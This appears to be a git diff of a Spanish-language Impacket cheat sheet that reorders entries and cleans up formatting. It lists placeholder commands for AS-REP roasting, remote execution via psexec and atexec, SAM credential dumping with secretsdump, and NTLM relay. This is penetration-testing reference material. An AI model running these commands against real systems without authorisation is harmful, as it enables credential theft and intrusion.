@@ -3,6 +3,21 @@ Descripción: Extrae tickets TGT (Ticket Granting Ticket) sin necesidad de auten
 ```python
 impacket-GetNPUsers DOMAIN/USER -dc-ip <domain_controller_ip>
 ```
+### impacket-psexec:
+Descripción: Ejecuta comandos en un sistema remoto utilizando el servicio PsExec.
+```python
+impacket-psexec.py DOMAIN/USER:PASSWORD@TARGET_HOST CMD.EXE
+```
+### impacket-rpcdump:
+Descripción: Realiza una enumeración de RPC en un host remoto.
+```python
+impacket-rpcdump.py DOMAIN/USER:PASSWORD@TARGET_HOST
+```
+### impacket-secretsdump:
+Descripción: Extrae contraseñas almacenadas en la SAM (Security Accounts Manager) de un sistema Windows.
+```python
+impacket-secretsdump.py DOMAIN/USER:PASSWORD@TARGET_HOST
+```
 ### impacket-atexec:
 Descripción: Permite ejecutar comandos en un sistema remoto utilizando el servicio Task Scheduler (programador de tareas).
 ```python
@@ -18,7 +33,7 @@ Descripción: Permite interactuar con bases de datos ESENT (Extensible Storage E
 ```python
 impacket-esentutl.py
 ```
-### impacket-getArch**:
+### impacket-getArch:
 Descripción: Obtiene la arquitectura del sistema remoto (32 o 64 bits).
 ```python
 impacket-getArch.py DOMAIN/USER:PASSWORD@TARGET_HOST
@@ -48,22 +63,3 @@ Descripción: Se utiliza para realizar ataques de relé NTLM en redes corporativ
 ```python
 impacket-ntlmrelayx.py -tf targets.txt
 ```
-### impacket-psexec:
-Descripción: Ejecuta comandos en un sistema remoto utilizando el servicio PsExec.
-```python
-impacket-psexec.py DOMAIN/USER:PASSWORD@TARGET_HOST CMD.EXE
-```
-### impacket-rpcdump:
-Descripción: Realiza una enumeración de RPC en un host remoto.
-```python
-impacket-rpcdump.py DOMAIN/USER:PASSWORD@TARGET_HOST
-```
-        
-13impacket-secretsdump:
-    
-    - Descripción: Extrae contraseñas almacenadas en la SAM (Security Accounts Manager) de un sistema Windows.
-    - Ejemplo:
-        
-        bashCopy code
-        
-        `impacket-secretsdump.py DOMAIN/USER:PASSWORD@TARGET_HOST`
